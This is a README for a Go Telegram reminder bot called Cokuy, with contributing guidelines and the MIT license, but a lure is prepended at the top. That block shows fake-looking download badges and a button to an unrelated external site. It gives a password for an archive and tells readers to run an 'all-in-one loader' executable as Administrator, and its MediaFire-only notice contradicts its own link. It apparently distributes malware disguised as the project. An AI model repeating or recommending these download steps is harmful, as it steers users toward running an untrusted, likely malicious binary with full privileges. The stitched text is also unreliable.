<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

## Core idea

**Persistent, not necessarily smart.**

Open loops are first-class state. Tasks, reminders, and nudges live in structured tables, not buried in chat transcripts. History retrieval is a fallback, not the memory architecture. The core state must outlive model swaps, provider changes, and rewrites, from a Go binary on a tiny VPS to a Cloudflare Worker on the free tier.

| Aspect | Usual agents | Cokuy v0.1 |
|---|---|---|
| Brain | Smartest model, biggest bill | Small cheap model, persistence does heavy lifting |
| Infra | Docker + Postgres + Redis + queue | One static binary + one SQLite file |
| Transport | Webhook + public URL + TLS | Long poll, dials out, no inbound ports |
| Memory | Vector DB + embeddings | Structured tables, history fallback only |
| Tools | Run inline during chat | None, outbox + scheduler instead |
| Reminders | Cron SaaS or plugins | Rows + 15 min tick, quiet 22:00-07:00 WIB |
| Access | Multi user SaaS auth | One owner ID, strangers get silence |
| Codebase | LangChain / agents SDK | Stdlib + 3 Go deps, no framework |
| Cost | Unknown until invoice | Per turn tokens + dollars logged, dashboard included |
| Models | Swap = rewrite prompts | Base URL + key swap, state outlives model |
| Server | Needs 2GB+ VPS | Tiny VPS, CGO free, systemd sandboxed |

## What it can do (v0.1)

* Chat over Telegram, locked to one owner by numeric ID. Strangers get silence, not an error message.
* Remember conversation per chat and answer with recent context under a fixed character budget.
* Detect open loops from normal conversation ("remind me in 20 minutes", "I still owe Budi an answer") and store them as structured state.
* Deliver reminders and follow-up nudges on its own, through a scheduler tick, with quiet hours respected (22:00 to 07:00 WIB, Asia/Jakarta).
* Cap outbound nudges per chat per day so it never spams you.
* Survive restarts and redeliveries: every Telegram update is claimed exactly once before it takes effect.
* Report its own spend: token usage and dollar cost per turn, with a local dashboard.

## How it works

One bounded turn per message: allowlist check, claim update, load recent history, call the model, persist both sides, detect loops and reminders, reply. A separate tick every 15 minutes flushes due reminders, drafts nudges for stale loops, and drains an outbox with quiet-hours gating and a daily cap. No tool execution in v0.1. No vector database. No framework magic. SQLite holds everything; the schema is the memory.

The model is a replaceable runtime component. Any OpenAI-compatible endpoint works through a single base URL plus key swap. The default setup runs MiniMax M2.7 highspeed through Sumopod at promo pricing, roughly three cents per million input tokens, but nothing in the architecture cares which provider answers.

## Try it

You need Go 1.25+, a Telegram bot token, your numeric Telegram ID (ask @userinfobot), and any OpenAI-compatible API key.

```bash
cp .env.example .env   # fill in TELEGRAM_BOT_TOKEN, ALLOWED_USER_IDS, LLM keys
go run ./cmd/cokuy
```

Then send your bot a message on Telegram. `/health` style endpoints and a SvelteKit dashboard live next door in `dashboard/` if you want eyes on spend and loops. Details are in DEVELOPMENT.md, SECURITY.md, and `docs/decisions/`.

## Status and siblings

v0.1 is the Go monolith snapshot: single static binary, systemd unit included, polling transport, local SQLite. A Cloudflare Worker port (Hono, D1, grammY, webhook plus cron) is being built as a sibling in a separate copy, and the dashboard already runs as its own app. Each sibling keeps this README's spirit and the same license: small, boring infrastructure first, persistence before cleverness.

## License

MIT. Copyright (c) Arsyadi Indra. See LICENSE.


---

# Contributing to Cokuy (Go)

Small, boring, cheap. Every contribution should make the bot more
persistent, more reliable, or cheaper to run. Cleverness that adds
moving parts needs a decision doc first.

## Where the project stands

This repo is the Go monolith snapshot (v0.1 + proactive loops + spend
ledger). Active development of new behavior happens in the Cloudflare
sibling first; proven ideas get backported here. That makes the most
valuable contributions **backports and hardening**, not new frameworks.

## Improvement points (ordered, highest leverage first)

1. **Robust detector backport.** The sibling runs partial-accept
   validation (per-item drop/clamp instead of wholesale reject), one
   schema-error retry, opportunistic `response_format` + `tools` with a
   triple-path parser, and a router pre-gate. This repo still
   wholesale-rejects. Port `internal/runtime/detect.go` toward that.
2. **Profile facts (M1).** `profile_facts(chat_id, key, value)` with a
   strict key allowlist, extracted in the detector pass, injected whole
   every turn. Fixes "remember my name" without any retrieval machinery.
3. **Rolling summary (M3).** `conversation_summaries` with a message-id
   watermark: inject summary whole + verbatim window above watermark,
   compact oldest past threshold in the background. Never summarize the
   summary, delete nothing.
4. **Feedback counters.** `turn_feedback(update_id, is_correction,
   is_rephrase)`: correction regex + rephrase similarity. Pure code, one
   tiny write per flagged turn. The dissatisfaction signal every later
   learning step keys off.
5. **Voice pin.** The persona prompt must name pronouns explicitly
   (gue/lu) with a ban list for formal register. "Casual" alone drifts.
6. **Reply sanitizer.** Scrub mojibake and non-Latin leaks before
   persist + send; log stripped counts.
7. **Tick granularity.** Scheduler currently ticks every 15 minutes.
   The sibling runs per-minute at trivial quota cost. Measure
   `cokuy.db` WAL pressure before copying.
8. **Tests around the turn.** Happy-path dedupe, stranger drop,
   send-failure stays unprocessed. Any new side effect needs a test
   proving its failure mode is recoverable.

Explicitly out of scope without a decision doc: vector databases,
agent frameworks, extra services, protocol machinery, anything that
needs more than a tiny VPS.

## Git convention

- `main` is the branch. PRs target `main`. (`master` is a stale
  pre-public-snapshot pointer; ignore it.)
- One logical change per commit. A commit must leave `go vet`,
  `go test ./...`, and the linux build green.
- Message shape: short imperative summary, scope prefix when it helps.
  Good: `detect: partial-accept loops, drop bad items`,
  `store: profile_facts table + upsert`, `docs: decision 0009`.
  Bad: `fix stuff`, `wip`, `update`.
- Architectural changes (new tables, new loops, policy changes) ship
  with a note under `docs/decisions/` numbered next in sequence,
  written before or with the code, never after the fact.
- Never commit `.env`, `cokuy.db`, tokens, or keys. `.env.example`
  holds placeholder shapes only. If a secret ever lands in history,
  say so in the PR and rotate it; history rewrites are a last resort.

## Pull requests

1. Open an issue first for anything bigger than a typo: what changes,
   why, what it costs (deps, quota, VPS RAM), and the exit path if it
   fails. Small fixes may skip this.
2. Branch from `main`: `area/short-name` (e.g. `detect/retry-budget`,
   `docs/contributing`).
3. PR description: problem, approach, verification output
   (`go vet`, `go test ./...`, cross-compile line), and migration notes
   if the schema changes (SQLite migrations must apply cleanly on an
   existing `cokuy.db`, never wipe user state).
4. One reviewer minimum. Stateless diffs (pure refactors) merge fast;
   stateful diffs (storage, scheduler, outbox) get a second look at
   failure paths: what happens on crash between write and send?
5. Squash on merge unless the branch is deliberately a commit series
   (e.g. one sprint). Keep history readable: each commit builds and
   passes on its own.

## Local verification (required before every PR)

```bash
go vet ./...
go test ./...
CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -o /tmp/cokuy ./cmd/cokuy
```


---

MIT License

Copyright (c) Arsyadi Indra

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
